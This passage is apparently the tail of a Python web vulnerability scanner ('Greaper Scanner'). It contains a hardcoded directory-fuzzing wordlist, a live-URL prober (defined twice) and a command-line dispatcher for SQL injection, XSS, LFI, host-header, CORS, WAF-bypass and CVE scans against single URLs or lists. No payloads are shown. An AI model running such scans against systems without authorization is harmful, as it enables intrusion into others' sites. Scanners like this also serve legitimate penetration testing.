"backup7.png", "image60", "image91", "config30.json", "download35", "user62", "backup59", "image52", "backup88.jpg", "example53", "download60", "admin58.html", "test59.html", "config49", "download68.xml", "user4.xml", "config98.xml", "backup75.xml", "image24.html", "login98", "config92", "image64.png", "example97.js", "service8.zip", "config15", "backup85.js", "service79", "login78.xml", "config65.css", "download70", "image6", "service29.png", "example99.json", "example94", "user12", "user43.xml", "backup32", "example13", "image58", "user80.css", "example8", "user31.zip", "backup64.php", "user73", "download79", "download15", "image81", "config80", "test15.zip", "user15.php", "download34", "admin14.json", "backup25.html", "backup24.zip", "test87", "config48", "download89", "login47.zip", "image63", "admin100", "download1", "service18", "example83.zip", "config65", "image96", "config32", "image3.html", "admin29", "example3", "admin62", "login9.png", "test94.jpg", "image74.jpg", "test95", "example24.css", "admin73", "backup63", "admin10.json", "image95", "test40", "backup2.xml", "example98", "test91", "backup95", "image18.xml", "config58.jpg", "image46.xml", "image55", "config57", "login11.css", "user23", "service75.js", "image63.xml", "example72.jpg", "example26.zip", "test69", "config17.php", "user17", "test78.jpg", "image48", "login51", "backup50", "image10.php", "backup82.php", "admin33", "download41", "service29.css", "service39", "test17.html", "config63.jpg", "config77.zip", "admin19", "test84", "service82", "service40.css", "test66", "image18", "service60.zip", "download69", "backup30", "user99", "user40", "download42.xml", "example5.xml", "service89.html", "backup98.png", "admin66.png", "download65", "image7.jpg", "user24", "download7", "image2", "user71", "config73.html", "service16.jpg", "user15.jpg", "backup22.html", "test74", "service31", "user45.jpg", "test28.json", "admin14.php", "download95.html", "test29.html", "config47.jpg", "image4", "config1.php", "user45.jpg", "config1", "service14", "test19.xml", "download96.html", "example67.jpg", "example86.html", "test78.html", "user82.zip", "login95", "image28.xml", "image22", "config82", "admin38", "example18", "service62", "service59", "download66.html", "login75", "backup2", "image29", "user11", "admin12", "login21.png", "config68", "service26", "download94.php", "config15.json", "user66", "download99", "test81", "example62.jpg", "config78.json", "login30.html", "config17", "user14", "example86", "example19", "backup52", "login10", "config77.html", "service16", "user84", "user15", "image85.css", "download55", "admin83", "example61", "download89.css", "backup12", "admin90.png", "download6", "admin24.js", "backup12", "example39.js", "user91.png", "test27", "login70"
        ]
        print(f"[*] Using default directory list with {len(directories)} entries")

    results = []
    for directory in directories:
        url = f"{target.rstrip('/')}/{directory}"
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)  # Prevent redirects to capture the exact status code
            status_code = response.status_code
            color = color_status_code(status_code)
            result = f"{color}{url} [Status {status_code}]{COLOR_RESET}"
            results.append(result)
            print(result if status_code != 404 else f"{COLOR_GREY}{result}{COLOR_RESET}")
        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Error accessing {url}: {str(e)}{COLOR_RESET}")

    save_results(output_file, results)

def check_live_urls(url, output_file=None):
    print(f"[*] Starting httprobing:")
    found_live = False
    results = []
    try:
        for protocol in ['https://', 'http://']:
            full_url = protocol + url
            response = requests.get(full_url, timeout=5, allow_redirects=False)
            if 200 <= response.status_code < 400:
                result = f"{COLOR_GREEN}{full_url}{COLOR_RESET}"
                results.append(result)
                found_live = True
                break
    except requests.RequestException:
        pass

    if found_live:
        print(results[0])
        if output_file:
            save_results(output_file, results)
def check_live_urls(url, output_file=None):
    found_live = False
    results = []
    try:
        for protocol in ['https://', 'http://']:
            full_url = protocol + url
            response = requests.get(full_url, timeout=5)
            if 200 <= response.status_code < 400:
                result = f"{COLOR_GREEN}{full_url}{COLOR_RESET}"
                results.append(result)
                found_live = True
                break
    except requests.RequestException:
        pass

    if found_live:
        print(results[0])
        if output_file:
            save_results(output_file, results)

# Including the main function definition
def main():
    parser = argparse.ArgumentParser(description="Greaper Scanner")
    
    parser = argparse.ArgumentParser(description="Greaper Scanner")

    parser.add_argument("-u", "--url", help="Single target URL to scan, with 'FUZZ' as the payload insertion point")
    parser.add_argument("-l", "--list", help="File containing multiple URLs to scan, one URL per line")
    parser.add_argument("-s", "--sub-enum", action="store_true", help="Enable subdomain enumeration")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-rl", "--rate-limit", type=int, default=3, help="Rate limit for subdomain requests")
    parser.add_argument("-sqli", action="store_true", help="Enable SQL Injection detection")
    parser.add_argument("-xss", action="store_true", help="Enable Greaper XSS scanning")
    parser.add_argument("-lfi", action="store_true", help="Enable Greaper LFI scanning")
    parser.add_argument("-p", "--payload-file", help="File containing payloads (for XSS, LFI, SQLi, etc.)")
    parser.add_argument("-dynamic", action="store_true", help="Enable Dynamic Payload Generation and Testing")
    parser.add_argument("-crawl", nargs='?', const=1, type=int, help="Crawl a site and extract links (optionally specify depth)")
    parser.add_argument("-hh", action="store_true", help="Scan for Host Header Injection")
    parser.add_argument("-cors", action="store_true", help="Scan for CORS misconfigurations")
    parser.add_argument("-ip", action="store_true", help="Perform advanced IP lookup and attempt WAF bypass")
    parser.add_argument("-cl", action="store_true", help="Check the content length of the target URLs")
    parser.add_argument("-lv", action="store_true", help="Check if the target subdomains are live and responding")
    parser.add_argument("-info", action="store_true", help="Scan JS files for sensitive information")
    parser.add_argument("-sec", action="store_true", help="Check security headers for the target URLs")
    parser.add_argument("-cve", action="store_true", help="Scan for CVEs based on server fingerprint")
    parser.add_argument("-sc", action="store_true", help="Check status codes of the URLs")
    parser.add_argument("-df", action="store_true", help="Enable directory fuzzing on common directories or specified wordlist via -p")

    args = parser.parse_args()

    if args.df:
        if args.url:
            directory_fuzz(target=args.url, output_file=args.output, payload_file=args.payload_file)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: directory_fuzz(target=u, output_file=args.output, payload_file=args.payload_file), urls)
    
    if args.sub_enum:
        if args.url:
            enumerate_subdomains(url=args.url, output_file=args.output, rate_limit=args.rate_limit)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: enumerate_subdomains(url=u, output_file=args.output, rate_limit=args.rate_limit), urls)
        else:
            print(f"{COLOR_ORANGE}[-] Subdomain enumeration requires a single target URL (-u) or a URL list file (-l).{COLOR_RESET}")

    elif args.sqli:
        if args.url:
            greaper_sqli_scanner(target=args.url, payload_file=args.payload_file, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_sqli_scanner(target=u, payload_file=args.payload_file, output_file=args.output), urls)

    elif args.xss:
        if args.url and args.payload_file:
            greaper_xss_scanner(target=args.url, payload_file=args.payload_file, output_file=args.output)
        elif args.list and args.payload_file:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_xss_scanner(target=u, payload_file=args.payload_file, output_file=args.output), urls)

    elif args.lfi:
        if args.url and args.payload_file:
            greaper_lfi_scanner(target=args.url, payload_file=args.payload_file, output_file=args.output)
        elif args.list and args.payload_file:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_lfi_scanner(target=u, payload_file=args.payload_file, output_file=args.output), urls)

    elif args.dynamic and args.url:
        dynamic_payload_generator(target=args.url, output_file=args.output)

    elif args.crawl:
        if args.url:
            crawled_urls = enhanced_crawl(url=args.url, depth=args.crawl)
            save_results(args.output, crawled_urls)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            for url in urls:
                crawled_urls = enhanced_crawl(url=url, depth=args.crawl)
                save_results(args.output, crawled_urls)

    elif args.hh:
        if args.url:
            greaper_host_header_scan(target=args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_host_header_scan(target=u, output_file=args.output), urls)

    elif args.cors:
        if args.url:
            greaper_cors_scan(target=args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_cors_scan(target=u, output_file=args.output), urls)

    elif args.ip:
        if args.url:
            greaper_ip_lookup_bypass(target=args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_ip_lookup_bypass(target=u, output_file=args.output), urls)

    elif args.cl:
        if args.url:
            get_content_length(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: get_content_length(u, output_file=args.output), urls)

    elif args.lv:
        if args.url:
            check_live_urls(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: check_live_urls(u, output_file=args.output), urls)

    elif args.info:
        if args.url:
            scan_js_files(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: scan_js_files(u, output_file=args.output), urls)

    elif args.sec:
        if args.url:
            check_security_headers(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: check_security_headers(u, output_file=args.output), urls)

    elif args.cve:
        if args.url:
            cve_scan_by_fingerprint(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: cve_scan_by_fingerprint(u, output_file=args.output), urls)

    elif args.sc:
        if args.url:
            check_status_code(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: check_status_code(u, output_file=args.output), urls)

    else:
        print(f"{COLOR_ORANGE}[-] Missing required arguments. Please provide a target URL (-u) or a URL list (-l) and appropriate payload file (-p) for the selected scan mode.{COLOR_RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"{COLOR_ORANGE}An unexpected error occurred: {e}{COLOR_RESET}")
    finally:
        sys.exit(0)
